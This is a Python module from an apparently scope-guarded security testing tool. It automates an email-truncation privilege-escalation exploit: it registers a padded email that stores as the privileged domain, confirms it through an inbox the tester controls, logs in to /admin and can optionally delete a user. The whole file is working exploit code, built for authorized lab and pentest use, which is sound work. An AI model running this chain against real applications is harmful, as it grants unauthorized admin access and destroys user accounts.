"""
Exceptional-input registration flow ("inconsistent handling of exceptional input").

Some apps gate privilege on the *domain* of the email stored at registration but
store that email in a fixed-width column that silently TRUNCATES over-long values,
while the mailer still sends the confirmation to the full (untruncated) address.

That discrepancy is exploitable: craft an email whose local part is padded so that

    <pad>@<privileged-domain>                      (first N chars - what gets STORED)
    <pad>@<privileged-domain>.<your-inbox-domain>  (full address - what mail is SENT to)

are the same string up to the truncation limit N. The confirmation lands in your
inbox (the full address is a deliverable subdomain you control), but the app files
you under the privileged domain -> administrative access.

Chain: GET /register (scrape priv domain + csrf) -> register the padded email ->
read the confirmation link from the email client -> confirm -> log in -> reach
/admin -> (optional, opt-in) perform the destructive objective and check solved.

Cross-host by design: the email client is usually a second host that MUST be in
`authorized_base_urls`. Everything stays scope-guarded.
"""

from __future__ import annotations

import logging
import re
import secrets
from urllib.parse import urlparse

from ..core.scope import Scope, ScopeError
from ..engine.http_client import RateLimiter, ScopedClient
from ..testing.schema import Severity, TestCase, TestStep, VulnClass, Verdict

logger = logging.getLogger("venom.flows.exceptional_input")

_CSRF = re.compile(r'name=["\']?csrf["\']?[^>]*?value=["\']?([^"\'\s>]+)')
# Privileged domain hint on the register/contact page; skip system no-reply addresses.
_PRIV = re.compile(r'@([A-Za-z0-9.-]+\.[A-Za-z]{2,})')
# A registration/confirmation link the lab emails back to the user.
_CONFIRM = re.compile(r'https?://[^\s"\'<>]+')


def _csrf(html: str | None) -> str | None:
    m = _CSRF.search(html or "")
    return m.group(1) if m else None


def _scrape_priv_domain(html: str) -> str:
    for dom in _PRIV.findall(html or ""):
        d = dom.lower().rstrip(".")
        if "noreply" in d or "no-reply" in d:
            continue
        return d
    return ""


def _is_confirm(url: str, lab_host: str) -> bool:
    low = url.lower()
    return lab_host in url and ("token" in low or "confirm" in low or "register?" in low)


def _find_confirm(inbox_html: str, lab_host: str, marker: str = "") -> str | None:
    """The confirmation link addressed to *our* email. Prefer the lab-host link
    nearest the recipient marker (our crafted address); fall back to the last
    such link in the inbox (most recent) so we don't grab another user's token."""
    html = inbox_html or ""
    if marker:
        i = html.find(marker)
        if i >= 0:
            near = html[i:i + 5000]
            for m in _CONFIRM.finditer(near):
                url = m.group(0).rstrip('"\'<>)')
                if _is_confirm(url, lab_host):
                    return url
    last = None
    for m in _CONFIRM.finditer(html):
        url = m.group(0).rstrip('"\'<>)')
        if _is_confirm(url, lab_host):
            last = url
    return last


def _find_delete(admin_html: str, target: str) -> str | None:
    m = re.search(r'href=["\']([^"\']*delete[^"\']*username=)[^"\'&]*["\']', admin_html or "")
    return (m.group(1) + target) if m else None


def _rel(url: str) -> str:
    p = urlparse(url)
    return p.path + (f"?{p.query}" if p.query else "")


def craft_truncation_email(priv_domain: str, inbox_domain: str, limit: int) -> str | None:
    """Build an email that truncates (at `limit`) to '<pad>@<priv_domain>' yet is
    deliverable as a subdomain of `inbox_domain`. Returns None if it can't fit."""
    suffix = "@" + priv_domain
    pad_len = limit - len(suffix)
    if pad_len < 1:
        return None                      # priv domain alone already exceeds the limit
    pad = "a" * pad_len
    # Full address is a real subdomain of the inbox host -> confirmation is delivered.
    return f"{pad}{suffix}.{inbox_domain}"


async def run(scope: Scope, registry, *, transport=None) -> list[TestCase]:
    if not scope.email_client_url:
        return []   # needs an inbox to read confirmation links
    if not any(e.path.rstrip("/").endswith("/register") for e in registry):
        return []

    lab_base = scope.authorized_base_urls[0]
    lab_host = urlparse(lab_base).hostname or ""
    ec = urlparse(scope.email_client_url)
    email_base = f"{ec.scheme}://{ec.netloc}"
    inbox_domain = ec.hostname or ec.netloc
    limit = scope.email_truncation_limit or 255
    limiter = RateLimiter(scope.rate_limit_per_second)

    try:
        lab = ScopedClient(scope, lab_base, role="xinput", limiter=limiter, transport=transport)
        mail = ScopedClient(scope, email_base, role="xinput-mail", limiter=limiter, transport=transport)
    except ValueError as exc:
        logger.warning("exceptional-input skipped: %s (add the email host to authorized_base_urls)", exc)
        return []

    steps: list[TestStep] = []
    user = "venom" + secrets.token_hex(3)
    pw = "Passw0rd!" + secrets.token_hex(2)
    try:
        reg = await lab.request("GET", "/register", follow_redirects=True)
        reg_html = reg.text if reg else ""
        priv = (scope.privileged_email_domain or _scrape_priv_domain(reg_html)).lower().rstrip(".")
        if not priv:
            logger.info("exceptional-input: no privileged domain found/configured - skipping")
            return []
        email = craft_truncation_email(priv, inbox_domain, limit)
        if not email:
            logger.info("exceptional-input: privileged domain too long for limit=%d", limit)
            return []
        steps.append(TestStep(step=1, description=f"GET /register (priv domain @{priv}, limit {limit})",
                              method="GET", path="/register",
                              actual_status=getattr(reg, "status_code", None)))

        logger.info("exceptional-input: registering padded email truncating to '<pad>@%s' "
                    "(full len=%d, stored=%d) deliverable via %s",
                    priv, len(email), limit, inbox_domain)
        await lab.request("POST", "/register", data={
            "csrf": _csrf(reg_html), "username": user, "email": email, "password": pw},
            follow_redirects=True)
        steps.append(TestStep(step=2, description=f"register '{user}' with length-truncating email",
                              method="POST", path="/register"))

        inbox = await mail.request("GET", ec.path or "/email", follow_redirects=True)
        link = _find_confirm(inbox.text if inbox else "", lab_host, marker="@" + priv)
        if not link:
            logger.info("exceptional-input: no confirmation link found in inbox - aborting")
            return []
        cr = await lab.request("GET", _rel(link), follow_redirects=True)
        steps.append(TestStep(step=3, description="confirm email via inbox link",
                              method="GET", path=urlparse(link).path,
                              actual_status=getattr(cr, "status_code", None)))

        lgp = await lab.request("GET", "/login")
        await lab.request("POST", "/login", data={
            "csrf": _csrf(lgp.text if lgp else ""), "username": user, "password": pw},
            follow_redirects=True)
        steps.append(TestStep(step=4, description=f"log in as '{user}'", method="POST", path="/login"))

        adm = await lab.request("GET", "/admin", follow_redirects=False)
        adm_ok = adm is not None and adm.status_code == 200
        steps.append(TestStep(step=5, description="access /admin panel", method="GET", path="/admin",
                              actual_status=getattr(adm, "status_code", None)))
        if not adm_ok:
            logger.info("exceptional-input: /admin not reachable (status=%s) - bypass not achieved",
                        getattr(adm, "status_code", None))
            return []

        solved = False
        target = scope.objective_delete_user
        if target and scope.allow_destructive:
            delpath = _find_delete(adm.text, target) or f"/admin/delete?username={target}"
            dr = await lab.request("GET", delpath, follow_redirects=True, destructive=True)
            home = await lab.request("GET", "/", follow_redirects=True)
            solved = bool(home is not None and "is-solved" in (home.text or ""))
            steps.append(TestStep(step=6, description=f"delete user '{target}' (objective)",
                                  method="GET", path=delpath,
                                  actual_status=getattr(dr, "status_code", None), destructive=True))
        elif target:
            logger.info("admin reached; delete '%s' skipped (set allow_destructive to perform it)", target)

        note = ("LAB SOLVED (is-solved)" if solved else
                ("admin access achieved; destructive objective not run" if target else
                 "admin access achieved"))
        verdict = Verdict.CONFIRMED_EXPLOIT if (adm_ok and (solved or not target)) else Verdict.NEEDS_REVIEW
        return [TestCase(
            test_id="XIN-001",
            vulnerability_class=VulnClass.PRIV_ESCALATION,
            hypothesis=("Inconsistent handling of exceptional input: the registration email is "
                        f"stored in a fixed-width field truncated to {limit} chars while the mailer "
                        "uses the full address. A padded email truncating to "
                        f"'@{priv}' grants the privileged (staff) domain -> administrative access."),
            risk_rating=Severity.CRITICAL,
            affected_endpoint="POST /register",
            business_impact="Any anonymous user gains full administrative access (incl. deleting users).",
            steps=steps,
            origin="flow",
            verdict=verdict,
            notes=[note],
            rag_source="PortSwigger: Inconsistent handling of exceptional input / WSTG-BUSL-03",
        )]
    except ScopeError as exc:
        logger.warning("exceptional-input blocked by scope: %s", exc)
        return []
    finally:
        await lab.aclose()
        await mail.aclose()
